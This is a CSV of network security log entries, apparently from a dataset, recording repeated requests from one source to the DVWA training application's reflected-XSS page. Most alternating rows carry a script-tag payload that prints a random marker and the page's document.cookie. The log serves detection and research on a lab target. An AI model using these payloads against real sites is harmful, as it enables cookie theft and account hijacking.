ID_regla,sessionid,repeatcnt,severity_number,Nombre_regla,thread_category,prot,src_ip,dst_ip,log_subtype,extra_data
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('VRC5IZI7P7HJ7SZJCDPEFWRK8KO71OSKC93XKDZO67X70EXCFE');console.log(document.cookie);</script>&user_token=49dd180ec8f60d49f6431ffaebbbc7a6
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('LPLHV8REZVY1E2NWOEZS1NTHLYR3TB5HZ5X0EP9ZX4W23SKYBP');console.log(document.cookie);</script>&user_token=6cea3d0e84fcda8732d6594420470571
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('16YA1G06WBJ4LZAS83B9WAXY5J9L4VQ2XJRYIY5BNZAY662E4M');console.log(document.cookie);</script>&user_token=77c1291beea5f96802de219ed6d96fb5
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('128TOZV3RUHU10IOTAMFYA3F2PPUV2ZDHPK3XF4TF5AQMD0CVN');console.log(document.cookie);</script>&user_token=588e8151d64dc352b6fa49a23b1b1d38
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('LNDK3LTH38LJGJ65I83F7DWB3UMED114GVMJJDKCCJHMQNOJV6');console.log(document.cookie);</script>&user_token=b620655c2dd54335d699734b0269651f
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('I0760GJF4821WQIMT3PKMC9C9ZPYIDX1O91DB5I9IAJNSAHR82');console.log(document.cookie);</script>&user_token=1bf605dce2c06eeb5c8736dcd30b987a
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('MAL1ADWSWYV9U31UALH7WOFON6Y0IHDOB9U1APE3W7S78BODCQ');console.log(document.cookie);</script>&user_token=8ef360607f924e4e6fd74f9ff8e13849
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('8JZKFTQ1F3LKJ4D9SEHBEYPXKHYAV70TC6RH2Q9FXMS2X4E0DF');console.log(document.cookie);</script>&user_token=216728be1bdd363eb93d75817f4a5b8c
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('3BYCJAB991V83F6F52W9UZXKJVUHMLMSLFSSV1034IN4WT1Y58');console.log(document.cookie);</script>&user_token=2abf8c20b9694622140d178d0c3aa895
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('9PSJQO1WD9EGR4S5PJ3H5N8OL3W2B70BRTJ6TEJQRWEND56STL');console.log(document.cookie);</script>&user_token=d9ae90546558f90851507fd55714cb20
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('X240DWPTI66BYXAJJVWY2M29D5XJS1FS9OTX287ZW7SASMLY70');console.log(document.cookie);</script>&user_token=5542d45e3526d2d23764f30a3ab256de
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('EKWP2GYF5UKMRWNEKKHAPUTGFNIIVXICAM6WOG7O3HHYA81XPV');console.log(document.cookie);</script>&user_token=605087636ab72b7c23b11ae7a74a47ab
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('Y50F1VW5KRFCEORQHDV0V4BDM5MK2WCVC56WG30G7BZUL5SVGV');console.log(document.cookie);</script>&user_token=1d1789c412a07b23f8015c4f172b2d0d
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('ZGQGXCA65ALUBOSFWQU0UCRTG0R1SGNB10IRYR7RFEKX2IIQBY');console.log(document.cookie);</script>&user_token=0e54986b4202697187ee9416d5e0191b
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('CN4H9S1IOOCPO2J7NJKRSTVLXU57T0X3JP84K5AHGNRYH9X3JV');console.log(document.cookie);</script>&user_token=aa83e7ae3a2b1d9985edc7d3dedc1309
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('LJDRS52SAOK6E0Y03OPJ75Y9JR9B4166PHCN0LP8OQ2CG0EYQ0');console.log(document.cookie);</script>&user_token=12d3fe801b1610e786cc57a292d6c047
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('C8JQ85JJ4CQ3UZ2G083UVT2DM0KTM2SU3ECY7R6AM8Z3UE6HXW');console.log(document.cookie);</script>&user_token=76422a8b4bccd2050f0982489bc3086e
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('DAJCYZNTBMQYV82Q2WL7RHUBD7MW0SA0NHS26CEZEBEEFU6JGK');console.log(document.cookie);</script>&user_token=68fa89f3e8c884e0d65a5f7ed89142b1
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('KNHDZ2UH7SJ9WAUACWHSGTC3OYS2SDO4ER96Q1PS6REP2CQ4VE');console.log(document.cookie);</script>&user_token=3926c6799686f876c93c0fe1c1b249ac
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('M896XRN6JHX12ICCF6FIHZRSE2VKJ33FKPZKHNIVJ71275M5FE');console.log(document.cookie);</script>&user_token=c57e7eaf0f7d5fdef588bad6666d331f
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('BXBZ4061SXE0H68A5C6RORHE94TW4S3UCVHXCOAB9F862ZYHBD');console.log(document.cookie);</script>&user_token=7486147e45d14122171a5e6a501c782e
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('L5Z7SP326716E36IV8KWB0JWFSL4WO7KQLBL42S8FGYPG12W2E');console.log(document.cookie);</script>&user_token=f334e461a78b11b2e514117c5db21aeb
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('P709WKN5SRN951L51CUAWVCDQSZOUZQ6156K8KIKXV88KGRZM3');console.log(document.cookie);</script>&user_token=3431aef5648842e1952e59ca9955ccb7
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('7LJBD4M47KG435EC5VN29J9OT3N8WLJKT53X84QRD4X4D6MHA9');console.log(document.cookie);</script>&user_token=4cf6274e2a3d7617288786d1b41c5194
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('HGKP0S4GATQ4IZI129HUS8NI5NJ6APULYNRSNKA74FM0ZVXWEZ');console.log(document.cookie);</script>&user_token=5c6dab29df253df14a483fbb7848873c
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('K7HEP7R7WE5CZGIYQK7JI9F312SP7SUA2P8VZ60JBREC03ECBR');console.log(document.cookie);</script>&user_token=5753afbe34b5e9de1528b075d313f30d
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('QCE8DDZQRSX9EV7D2XRNKXIG2TPO29BOPSURXCIAFYFUI216I0');console.log(document.cookie);</script>&user_token=a28e7705dfd4e2ecec467155990c9089
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('2CQNGE0ZDLZ8GDUB1OUR7XMI1MJVKE3QBVVYQIS3KYQNRX1RTX');console.log(document.cookie);</script>&user_token=567cfa6d1bce1dc4762888bc5da462a6
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('UL2FAMP7LM0NJP02ITL3VLQPBF4CL0A4DRUYZVK5QMS0B06RDL');console.log(document.cookie);</script>&user_token=e4e94b5ada30e094e6dde037e1d72c63
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('XMURGCT4IKK12HWDFTE66SWULWNA5CJWSDDZEA0V4UPBNQ9YV4');console.log(document.cookie);</script>&user_token=0f2a7dc87a7b847e96386ce978142f36
9999,775468,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,779287,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('XPNJGWDJ5LCDX7I7JBAYHDIMHEHBI8BATSPNES7TXFJLIP9KCA');console.log(document.cookie);</script>&user_token=9dbc9d628d598769a578925e683ad7e7
9999,779287,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,779287,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('U3YFAKCSB67CGRSIFW8OKZ1C40SNS0QX5IUIF93633ZMEBPOGO');console.log(document.cookie);</script>&user_token=56d60b612e442e9c3c432e5904511dda
9999,779287,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,779287,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('ZAPIX8MQH61QJNSS2270QZ66EAD4PXFZA9K3BU3WNNU5D5V4N6');console.log(document.cookie);</script>&user_token=160c23d6ac5fb84d7d339fad0bec80cb
9999,779287,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,779287,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('VPIBOC2HPNSPMKIBPRA4IKNY7FTNBJ6ZPE5I2OKPCAHFTXFFN6');console.log(document.cookie);</script>&user_token=608bcc984f44dbbbd83ffc842c331646
9999,779287,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,779287,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('EZBJWUT1K1S97T13551MBBZM966OTH7O0C1QXBSB6R7THF17YW');console.log(document.cookie);</script>&user_token=a310861ff7f10bf15b1a0feba99f4f1d
9999,777025,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,777025,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/login.php
9999,777025,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/favicon.ico
9999,777025,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/login.php
9999,777025,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/index.php
9999,777025,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,777025,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('WOXP99QEXGOZG9EFFWS1WUAGL0BEWJAOJ8OTVEN2AYJGXP4JRC');console.log(document.cookie);</script>&user_token=f9efff2744f7d0f28414d20d686088be
9999,777025,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,777025,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('AVWS8TY2A9XW8WZXDC8GUEGARGUV2Z69Q523CPGXMCYI91R9UE');console.log(document.cookie);</script>&user_token=8d3d975a6aa13b58b3da0448d5c8d8a2
9999,777025,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
